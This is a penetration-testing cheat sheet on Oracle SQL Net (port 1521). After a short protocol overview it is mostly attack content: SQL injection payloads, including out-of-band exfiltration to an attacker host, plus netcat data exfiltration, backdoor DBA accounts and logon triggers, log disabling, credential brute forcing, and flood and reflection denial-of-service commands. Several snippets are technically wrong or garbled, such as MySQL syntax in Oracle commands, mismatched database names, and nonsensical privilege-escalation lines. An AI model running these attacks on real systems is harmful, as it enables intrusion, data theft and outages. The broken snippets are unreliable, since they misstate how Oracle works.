# P1521 Oracle SQL NET

## Index

* \[\[Ports, Protocols, and Services]]

## Oracle SQL Net (Net8)

* **Port Number:** 1521 (default)
* **Protocol:** TCP
* **Service Name:** Oracle SQL Net (Net8)
* **Defined in:** Oracle Documentation (Oracle Database Net Services Administrator's Guide)

Oracle SQL Net, also known as Oracle Net or Net8, is a protocol used by Oracle Database to communicate over a network. It allows clients and servers to communicate regardless of the underlying network protocol stack. Oracle SQL Net is designed to provide seamless connectivity between Oracle clients and servers, enabling the execution of SQL commands, data retrieval, and database management tasks over a TCP/IP network.

### Overview of Features

* **Network Abstraction:** SQL Net abstracts the details of the network protocol, allowing Oracle databases to communicate over different network environments without requiring changes to the application.
* **Session Layer Functionality:** It operates at the session layer of the OSI model, establishing and managing connections between Oracle clients and servers.
* **Multiplexed Connections:** SQL Net supports multiplexed connections, where multiple database sessions can be carried over a single network connection, reducing the overhead of multiple network connections.
* **Support for Oracle RAC:** SQL Net is integral in Oracle Real Application Clusters (RAC) environments, where it handles the communication between nodes in a clustered database system.
* **Encryption and Data Integrity:** Supports advanced features like encryption and data integrity checks through Oracle Advanced Security.
* **Failover and Load Balancing:** Provides failover and load balancing capabilities to ensure high availability and performance in distributed environments.

### Typical Use Cases

* **Database Client Connectivity:** SQL Net is primarily used by Oracle clients (e.g., SQL Plus, Oracle SQL Developer) to connect to Oracle databases for executing SQL queries, retrieving data, and managing the database.
* **Database Replication:** Facilitates communication between databases in replication environments where data needs to be synchronized across multiple database instances.
* **Application Servers:** Application servers use SQL Net to connect to Oracle databases, allowing them to retrieve and manipulate data as part of the application's functionality.
* **Distributed Database Systems:** In distributed database environments, SQL Net manages the communication between different database nodes, ensuring data consistency and availability.

### How Oracle SQL Net Works

1. **Service Registration:**
   * **Step 1:** When an Oracle database instance starts, it registers itself with the Oracle Listener, a process that listens on a specified port (default 1521) for connection requests.
   * **Step 2:** The Listener is responsible for routing incoming connection requests to the appropriate database service based on the client's request.
2. **Client Connection Initiation:**
   * **Step 3:** The Oracle client uses a TNS (Transparent Network Substrate) descriptor to specify the database to connect to. The descriptor includes the hostname, port, and service name or SID.
   * **Step 4:** The client sends a connection request to the Oracle Listener on the specified port (default 1521).
3. **Listener Processing:**
   * **Step 5:** The Listener checks the client's connection request, and if the requested service is registered, it forwards the connection request to the database instance.
   * **Step 6:** The Listener can redirect the client to a different port or node, particularly in RAC or multi-instance environments, to balance the load or provide failover.
4. **Session Establishment:**
   * **Step 7:** Once the connection is accepted, a session is established between the client and the database server. The SQL Net protocol manages this session, handling the communication of SQL commands and results between the client and server.
5. **Data Transmission:**
   * **Step 8:** SQL Net encapsulates SQL commands, queries, and responses in network packets, which are transmitted over TCP to the Oracle database server.
   * **Step 9:** The server processes the SQL requests and sends back the results, which are then decoded by the client.
6. **Session Termination:**
   * **Step 10:** The session can be terminated by either the client or the server. SQL Net ensures that any remaining data in transit is handled appropriately before closing the session.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` initiates a connection to `<target_ip>`:1521 using a TNS descriptor.
* **Server:** `<target_ip>` receives the request, the Listener forwards it to the appropriate Oracle instance, and a session is established.
* **Client:** `<attack_ip>` sends SQL queries, receives results, and eventually terminates the session.

## Additional Information

### Security Considerations

* **TNS Poisoning:** One of the significant risks associated with Oracle SQL Net is TNS poisoning, where an attacker can intercept or modify the TNS traffic to manipulate database connections.
* **Encryption:** SQL Net supports encryption through Oracle Advanced Security. Without encryption, data sent over the network is vulnerable to interception and unauthorized access.
* **Firewall Considerations:** Since SQL Net operates over TCP port 1521, it's crucial to ensure that firewalls are properly configured to restrict access to this port, limiting exposure to only trusted clients.

### Oracle Advanced Security

* **Encryption Algorithms:** SQL Net supports a variety of encryption algorithms, including AES, DES, and 3DES, which can be configured to secure communication between clients and servers.
* **Data Integrity Checks:** SQL Net can perform data integrity checks to ensure that data has not been tampered with during transmission.

### TNS Names and Easy Connect

* **TNS Names:** A configuration file (`tnsnames.ora`) that maps logical database names to network addresses.
* **Easy Connect:** A simplified connection method that doesn't require `tnsnames.ora`, allowing clients to connect using a simple string: `hostname:port/service_name`.

### Load Balancing and Failover

* **Load Balancing:** SQL Net can distribute client connections across multiple database instances to optimize resource usage.
* **Failover:** In case of a failure in one instance, SQL Net can automatically redirect the connection to another available instance, ensuring continuity.

### Configuration Files

1. **tnsnames.ora:**

* **File Location:** `$ORACLE_HOME/network/admin/tnsnames.ora`
*   **Configuration Example:**

    ```plaintext
    ORCL =
      (DESCRIPTION =
        (ADDRESS = (PROTOCOL = TCP)(HOST = <target_ip>)(PORT = 1521))
        (CONNECT_DATA =
          (SERVER = DEDICATED)
          (SERVICE_NAME = orcl)
        )
      )
    ```
* **Key Settings:**
  * `ADDRESS`: Defines the protocol, hostname, and port for the connection.
  * `SERVICE_NAME`: Specifies the database service to connect to.
  * `SERVER`: Indicates whether the connection is dedicated or shared.

2. **listener.ora:**

* **File Location:** `$ORACLE_HOME/network/admin/listener.ora`
*   **Configuration Example:**

    ```plaintext
    LISTENER =
      (DESCRIPTION_LIST =
        (DESCRIPTION =
          (ADDRESS = (PROTOCOL = TCP)(HOST = <target_ip>)(PORT = 1521))
        )
      )
    ```
* **Key Settings:**
  * `PROTOCOL`: Specifies the protocol used (typically TCP).
  * `PORT`: Defines the port the Listener will listen on for incoming connections.
  * `HOST`: Specifies the hostname or IP address of the Listener.

3. **sqlnet.ora:**

* **File Location:** `$ORACLE_HOME/network/admin/sqlnet.ora`
*   **Configuration Example:**

    ```plaintext
    SQLNET.AUTHENTICATION_SERVICES = (NONE)
    SQLNET.ENCRYPTION_CLIENT = required
    SQLNET.ENCRYPTION_TYPES_CLIENT = (AES256)
    SQLNET.CRYPTO_CHECKSUM_CLIENT = required
    SQLNET.CRYPTO_CHECKSUM_TYPES_CLIENT = (SHA256)
    ```
* **Key Settings:**
  * `SQLNET.AUTHENTICATION_SERVICES`: Defines the authentication methods used.
  * `SQLNET.ENCRYPTION_CLIENT`: Specifies whether encryption is required or optional.
  * `SQLNET.ENCRYPTION_TYPES_CLIENT`: Lists the encryption algorithms to be used.
  * `SQLNET.CRYPTO_CHECKSUM_CLIENT`: Enables data integrity checks.
  * `SQLNET.CRYPTO_CHECKSUM_TYPES_CLIENT`: Specifies the algorithms for checksums.

### Potential Misconfigurations

1. **Weak or No Encryption:**
   * **Risk:** SQL Net traffic can be intercepted and read if encryption is not enabled.
   * **Exploitation:** An attacker intercepting network traffic could extract sensitive data or credentials.
2. **TNS Poisoning:**
   * **Risk:** TNS configuration files (`tnsnames.ora`, `listener.ora`) can be manipulated, leading to unauthorized redirection of database connections.
   * **Exploitation:** By altering the TNS settings, an attacker could redirect connections to a malicious server, leading to data breaches.
3. **Open Listener Port (1521):**
   * **Risk:** Exposing the Listener port to the internet or untrusted networks increases the attack surface.
   * **Exploitation:** Attackers can perform port scans to identify open Listener ports and attempt to exploit vulnerabilities in the Oracle database or gain unauthorized access.
4. **Misconfigured TNS Names:**
   * **Risk:** Incorrect TNS configuration can lead

to connection failures or unintentional exposure of database services.

* **Exploitation:** Attackers can exploit misconfigurations to identify and connect to unintended database instances.

5. **Insecure Listener Passwords:**
   * **Risk:** Default or weak Listener passwords can be brute-forced, allowing attackers to manipulate the Listener and potentially disrupt or redirect database traffic.
   * **Exploitation:** Attackers could gain control over the Listener, redirect connections, or deny service to legitimate users.

### Default Credentials

* **SYS (default admin account):**
  * **Username:** `SYS`
  * **Password:** `change_on_install` (default, should be changed immediately upon installation)
* **SYSTEM (another default admin account):**
  * **Username:** `SYSTEM`
  * **Password:** `manager` (default, should be changed immediately upon installation)
* **SCOTT (default schema for demo purposes):**
  * **Username:** `SCOTT`
  * **Password:** `tiger` (default, often used in examples and testing)

These credentials can be easily brute-forced or guessed if not changed, potentially leading to unauthorized access to the Listener.

## Interaction and Tools

### Oracle SQL Net

#### Oracle SQL Net Commands

#### SQL Injection

**Error-Based SQLi**

*   **Division by Zero:** Causes a division by zero error.

    ```
    ' AND 1/(SELECT COUNT(*) FROM all_tables)=0 -- -
    ```
*   **Column Length Error:** Forces an error by exceeding the column length limit.

    ```
    ' AND 1=UTL_INADDR.get_host_address((SELECT column_name FROM all_tab_columns WHERE ROWNUM = 1)) -- -
    ```
*   **Function Error:** Uses a length mismatch to cause an error.

    ```
    ' AND LENGTH((SELECT banner FROM v$version WHERE ROWNUM = 1))=1000 -- -
    ```

**Union-Based SQLi**

*   **Database Version:** Retrieves the Oracle database version.

    ```
    ' UNION SELECT NULL, banner FROM v$version WHERE ROWNUM=1 -- -
    ```
*   **Database User:** Extracts the current Oracle database user.

    ```
    ' UNION SELECT NULL, user FROM dual -- -
    ```
*   **Table Name Enumeration:** Lists the names of all tables accessible by the user.

    ```
    ' UNION SELECT NULL, table_name FROM all_tables WHERE ROWNUM=1 -- -
    ```
*   **Column Name Enumeration:** Extracts the column names from a specified table.

    ```
    ' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1 -- -
    ```
*   **User Data Extraction:** Retrieves usernames and passwords from the `USERS` table.

    ```
    ' UNION SELECT NULL, username, password FROM USERS -- -
    ```

**Boolean-Based SQLi**

*   **Checking Oracle Version:** Evaluates to true if the Oracle version starts with '1'.

    ```
    ' AND SUBSTR(BANNER, 1, 1) = '1' FROM v$version WHERE ROWNUM = 1 -- -
    ```
*   **Determining the Number of Tables:** Evaluates to true if there are more than 100 tables.

    ```
    ' AND (SELECT COUNT(*) FROM all_tables) > 100 -- -
    ```
*   **Checking Existence of a Column:** Evaluates to true if the `PASSWORD` column exists in the `USERS` table.

    ```
    ' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'USERS' AND column_name = 'PASSWORD') > 0 -- -
    ```
*   **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `USERS` table is 'a'.

    ```
    ' AND (SELECT SUBSTR(USERNAME, 1, 1) FROM USERS WHERE ROWNUM = 1) = 'a' -- -
    ```

**Time-Based SQLi**

*   **Basic Time Delay Test:** Causes the Oracle database to wait for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

    ```
    ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 5) -- -
    ```
*   **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

    ```
    ' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
    ```
*   **Checking Oracle Version:** Causes a 5-second delay if the Oracle version starts with '1'.

    ```
    ' AND CASE WHEN (SUBSTR(BANNER, 1, 1) = '1') THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END FROM v$version WHERE ROWNUM = 1 -- -
    ```
*   **Checking Existence of a Table:** Causes a 5-second delay if the `USERS` table exists.

    ```
    ' AND CASE WHEN (EXISTS (SELECT 1 FROM all_tables WHERE table_name = 'USERS')) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
    ```
*   **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `USERS` table is 'a'.

    ```
    ' AND CASE WHEN (SUBSTR((SELECT USERNAME FROM USERS WHERE ROWNUM = 1), 1, 1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
    ```

**Out-of-Band SQLi**

*   **DNS Exfiltration Using UTL\_INADDR:** Causes Oracle to perform a DNS lookup, appending the database username to the attacker's domain, thus exfiltrating the username via DNS.

    ```
    ' AND (SELECT UTL_INADDR.get_host_name((SELECT user FROM dual || '.attacker.com')) FROM dual) IS NOT NULL -- -
    ```
*   **HTTP Exfiltration Using UTL\_HTTP:** Sends an HTTP request containing the current Oracle database user to an attacker-controlled server.

    ```
    ' AND (SELECT UTL_HTTP.request('http://attacker.com/?user=' || user) FROM dual) IS NOT NULL -- -
    ```
*   **HTTP Exfiltration Using DBMS\_LDAP:** Uses the Oracle DBMS\_LDAP package to initiate a connection to an LDAP server controlled by the attacker, leaking data.

    ```
    ' AND (SELECT DBMS_LDAP.init('attacker.com', 389) FROM dual) IS NOT NULL -- -
    ```

### Tools

#### \[\[SQL Plus]]

*   **Connecting via SQL Plus:** Connects to an Oracle database using the specified TNS alias defined in `tnsnames.ora`.

    ```bash
    sqlplus <username>/<password>@<tns_alias>
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 1521"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 1521
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 1521
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 1521 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 1521
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 1521 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:1521
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p 1521
    ```

#### \[\[ODAT]] (Oracle Database Attacking Tool)

*   **Scan Target:** Exploit TNS poisoning vulnerabilities in Oracle SQL Net.

    ```bash
    ./odat.py tnspoison -s <target_ip> -p 1521 --sid orcl
    ```

### Other Techniques

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 1521
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 1521
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Exploiting Default Credentials

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=oracle --batch --passwords
    ```
* **Description:** Attempts to log in using default or weak credentials to gain access to the MySQL database.

#### Exploiting SQL Injection

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=oracle --dump
    ```
* **Description:** Exploits SQL Injection vulnerabilities to extract data from MSSQL databases.

#### Exploiting TNS Poisoning

*   **Tool:** \[\[ODAT]]

    ```bash
    ./odat.py tnspoison -s <target_ip> -p 1521 --sid orcl
    ```
* **Description:** Exploiting TNS poisoning vulnerabilities to manipulate database connections.

### Persistence

#### Backdooring TNS Listener

*   **Tool:** \[\[Custom Scripts]] \[\[ODAT]]

    ```bash
    ./odat.py tnspoison -s <target_ip> -p 1521 --sid orcl --backdoor
    ```
* **Description:** Install a persistent backdoor in the TNS Listener to maintain access to the Oracle database.

#### Backdoor Listener Configuration

*   **Tool:** \[\[SQL Plus]]

    ```sql
    EXEC DBMS_NETWORK_ACL_ADMIN.ADD_PRIVILEGE('acl.xml', 'PUBLIC', TRUE, 'connect');
    ```
* **Description:** Modify listener configurations to allow persistent backdoor access, enabling repeated unauthorized connections.

#### Leveraging Oracle Jobs for Persistence

*   **Tool:** \[\[SQL Plus]]

    ```sql
    BEGIN
      DBMS_SCHEDULER.create_job (
        job_name => 'persistent_job',
        job_type => 'PLSQL_BLOCK',
        job_action => 'BEGIN DBMS_OUTPUT.put_line(''Backdoor Active''); END;',
        start_date => SYSTIMESTAMP,
        repeat_interval => 'FREQ=MINUTELY;INTERVAL=1',
        enabled => TRUE
      );
    END;
    /
    ```
* **Description:** Create a persistent job that runs periodically within the Oracle database.

#### Create a SQL User Account

*   **Tool:** \[\[SQL Plus]]

    ```sql
    CREATE USER backdoor IDENTIFIED BY <password>;
    GRANT DBA TO backdoor;
    ```
* **Description:** Creates a new user with DBA privileges for persistent access to the database.

#### Trigger-Based Persistence

*   **Tool:** \[\[SQL Plus]]

    ```sql
    CREATE OR REPLACE TRIGGER backdoor_trigger
    AFTER LOGON ON DATABASE
    BEGIN
      EXECUTE IMMEDIATE 'GRANT DBA TO backdoor';
    END;
    ```
* **Description:** Creates a trigger that automatically re-grants DBA privileges to a backdoor user upon login.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 1521"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### Extracting Password Hashes

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT username, password FROM dba_users;
    ```

\


*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/admin/oracle/oracle_hashdump
    set RHOSTS <target_ip>
    set SID orcl
    run
    ```
* **Description:** Retrieves password hashes from the Oracle database, which can then be cracked offline.

### Privilege Escalation

#### Abuse of Oracle Roles

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SET ROLE DBA;
    ALTER USER scott IDENTIFIED BY new_password;
    ```
* **Description:** Exploit misconfigured roles or privileges within the Oracle database to escalate privileges, potentially gaining DBA access.

#### Abusing PUBLIC Privileges

*   **Tool:** \[\[SQL Plus]]

    ```sql
    EXEC UTL_FILE.FREMOVE('/tmp', 'backdoor.sql');
    ```
* **Description:** Exploits over-privileged PUBLIC roles to perform unauthorized actions.

#### Exploiting Vulnerable Stored Procedures

*   **Tool:** \[\[SQL Plus]]

    ```sql
    EXEC dbms_scheduler.create_job('exploit_job', 'PLSQL_BLOCK', 'GRANT DBA TO backdoor');
    ```
* **Description:** Exploits a vulnerable stored procedure to escalate privileges within the database.

#### Exploiting Oracle Packages

*   **Tool:** \[\[SQL Plus]]

    ```sql
    exec SYS.DBMS_JAVA.loadjava('chmod u+s /bin/bash');
    ```
* **Description:** Exploit vulnerable Oracle packages to escalate privileges within the database.

#### Gaining DBA Privileges

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/admin/oracle/oracle_sql
    set RHOSTS <target_ip>
    set SID orcl
    set SQL "GRANT DBA TO PUBLIC"
    run
    ```
* **Description:** Execute SQL commands to escalate privileges by granting DBA roles to public.

#### Privilege Escalation via UTL\_FILE

* **Tool:** \[\[SQL Plus]]

```bash
EXEC UTL_FILE.FREMOVE('/tmp', 'exploit.sql');
```

* **Description:** Exploits the UTL\_FILE package to gain elevated privileges on the Oracle database.

### Internal Reconnaissance

#### Database Schema Enumeration

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM all_tables;
    ```
* **Description:** Enumerates all tables within the Oracle database to identify sensitive data.

#### User Enumeration

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM all_users;
    ```
* **Description:** Enumerate all users within the Oracle database to identify potential targets for further exploitation.

#### Enumerating Oracle Tables and Users

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT username FROM dba_users;
    SELECT table_name FROM all_tables WHERE owner = 'SCOTT';
    ```
* **Description:** Enumerate database users and tables to gather information about the database environment.

#### Exploring the Data Dictionary

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM dba_objects WHERE object_type = 'TABLE';
    ```
* **Description:** Query the Oracle data dictionary to understand the database's structure and contents.

### Lateral Movement, Pivoting, and Tunnelling

#### Database Links Exploitation

*   **Tool:** \[\[SQL Plus]]

    ```sql
    CREATE DATABASE LINK backdoor_link CONNECT TO backdoor IDENTIFIED BY password USING '<target_tns>';
    SELECT * FROM target_table@link_to_target;
    ```
* **Description:** Use database links to move laterally within Oracle environments, accessing data or executing queries on linked databases.

#### Pivoting through Oracle DB Links

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM ALL_DB_LINKS;
    EXECUTE IMMEDIATE 'ALTER SESSION SET GLOBAL_NAMES = TRUE';
    ```
* **Description:** Use database links to move laterally between connected Oracle instances.

#### Tunneling with Oracle SQL Net

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L 1521:<internal_ip>:1521 <username>@<pivot_ip>
    ```
* **Description:** Tunnel Oracle SQL Net traffic through SSH to bypass firewalls or restricted networks.

### Defense Evasion

#### Obfuscating SQL Commands

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM /*+ index_asc(emp emp_pk) */ employees;
    ```
* **Description:** Use SQL hints and comments to obfuscate malicious queries.

#### SQL Net Traffic Obfuscation

*   **Tool:** \[\[SQL Plus]]

    ```sql
    EXECUTE IMMEDIATE 'ALTER SESSION SET SQL_TRACE=FALSE';
    ```
* **Description:** Disables SQL tracing to avoid detection by database auditing tools.

#### Encrypting SQL Net Traffic

*   **Tool:** \[\[SQL Net]]

    ```sql
    ALTER SYSTEM SET ENCRYPTION_WALLET_OPEN IDENTIFIED BY "password";
    ```
* **Description:** Configure SQL Net to use encryption, making it harder for defenders to inspect or detect malicious traffic.

#### Using Stealthier Protocols

*   **Tool:** \[\[SQL Net]]

    ```sql
    ALTER SYSTEM SET SQLNET.CRYPTO_CHECKSUM_CLIENT = REQUIRED;
    ```
* **Description:** Configure SQL Net to use secure checksum algorithms, ensuring traffic integrity and reducing detectability.

#### Using Alternate Ports

*   **Tool:** \[\[SQL Plus]]

    ```sql
    ALTER SYSTEM SET LOCAL_LISTENER='(ADDRESS=(PROTOCOL=TCP)(HOST=<target_ip>)(PORT=<custom_port>))';
    ```
* **Description:** Configures the Oracle Listener to operate on a non-default port to avoid detection.

#### Modifying Listener Logging

*   **Tool:** \[\[lsnrctl]]

    ```bash
    lsnrctl set log_status off
    ```
* **Description:** Disable Listener logging to avoid detection during an attack.

### Data Exfiltration

#### Exfiltrating Data via SQL Net

*   **Tool:** SQL Plus

    ```sql
    SELECT * FROM sensitive_table INTO OUTFILE '/tmp/exfiltrated_data.txt';
    ```
* **Description:** Exfiltrate sensitive data from the Oracle database by exporting it to a file or over the SQL Net connection.

#### Using Database Links for Exfiltration

*   **Tool:** SQL Plus

    ```sql
    INSERT INTO remote_table@exfil_link SELECT * FROM sensitive_table;
    ```
* **Description:** Transfer sensitive data from one Oracle database to another controlled by the attacker using database links.

#### Exfiltrating Data via SQL Net

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SPOOL '/tmp/data.txt';
    SELECT * FROM sensitive_table;
    SPOOL OFF;
    ```
* **Description:** Extract data from the database and save it to a file on the server.

#### Using Oracle Jobs for Data Exfiltration

*   **Tool:** \[\[SQL Plus]]

    ```sql
    BEGIN
      DBMS_SCHEDULER.create_job (
        job_name => 'exfil_job',
        job_type => 'PLSQL_BLOCK',
        job_action => 'BEGIN UTL_FILE.FOPEN(''/tmp'', ''data.txt'', ''W''); END;',
        start_date => SYSTIMESTAMP,
        repeat_interval => 'FREQ=HOURLY;INTERVAL=1',
        enabled => TRUE
      );
    END;
    /
    ```
* **Description:** Set up a scheduled job to periodically exfiltrate data from the database.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra oracle-sid://<target_ip> -s <target_port> -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra oracle-sid://<target_ip> -s <target_port> -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Offline Hash Cracking

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

\


*   **Tool:** \[\[HashCat Cheat Sheet]]

    ```bash
    hashcat -m <mode> <hash_file> <path/to/wordlist>
    ```
* **Description:** Cracks dumped password hashes to gain access.

#### Oracle SID Brute Forcing

*   **Tool:** \[\[ODAT]]

    ```bash
    ./odat.py sidguesser -s <target_ip> -p 1521
    ```
* **Description:** Brute force Oracle SIDs to discover the database instance name.

#### Brute Forcing Oracle Credentials

*   **Tool:** \[\[Metasploit]], \[\[Hydra Cheat Sheet]]

    ```bash
    hydra -l SYSTEM -P /path/to/passwords.txt <target_ip> oracle-sid
    ```
* **Description:** Attempt to brute-force Oracle database credentials to gain initial access.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 1521 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 1521 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### Overloading with Large Queries

*   **Tool:** \[\[SQL Plus]]

    ```sql
    SELECT * FROM large_table WHERE ROWNUM = 1 ORDER BY dbms_random.value;
    ```
* **Description:** Execute resource-intensive queries to overload the Oracle database, leading to degraded performance or downtime.

### Exploits

#### Oracle Listener Poison Attack

*   **Tool:** \[\[Metasploit]]

    ```bash
    msf > use auxiliary/admin/oracle/tnspoison
    ```

\


*   **Tool:** \[\[ODAT]]

    ```bash
    ./odat.py tnspoison -s <target_ip> -p 1521 --sid orcl --exploit
    ```
* **Description:** Exploits vulnerabilities in the Oracle Listener to redirect client connections to a malicious server.

## Resources

| **Website**                                        | **URL**                                                     |
| -------------------------------------------------- | ----------------------------------------------------------- |
| Oracle Database Net Services Administrator's Guide | https://docs.oracle.com/en/database/oracle/oracle-database/ |
| ODAT (Oracle Database Attacking Tool) GitHub       | https://github.com/quentinhardy/odat                        |
| Nmap Scripting Engine (NSE) Documentation          | https://nmap.org/book/nse.html                              |
| Metasploit Oracle Modules                          | https://www.rapid7.com/db/modules/                          |
| SQL Plus User's Guide                              | https://docs.oracle.com/en/database/oracle/oracle-database/ |
| Oracle Advanced Security Guide                     | https://docs.oracle.com/en/database/oracle/oracle-database/ |
| Wireshark User Guide                               | https://www.wireshark.org/docs/wsug\_html\_chunked/         |
| Oracle Listener Control (lsnrctl) Documentation    | https://docs.oracle.com/en/database/oracle/oracle-database/ |
| Linux man-pages                                    | https://man7.org/linux/man-pages/                           |
| Hashcat Documentation                              | https://hashcat.net/wiki/                                   |
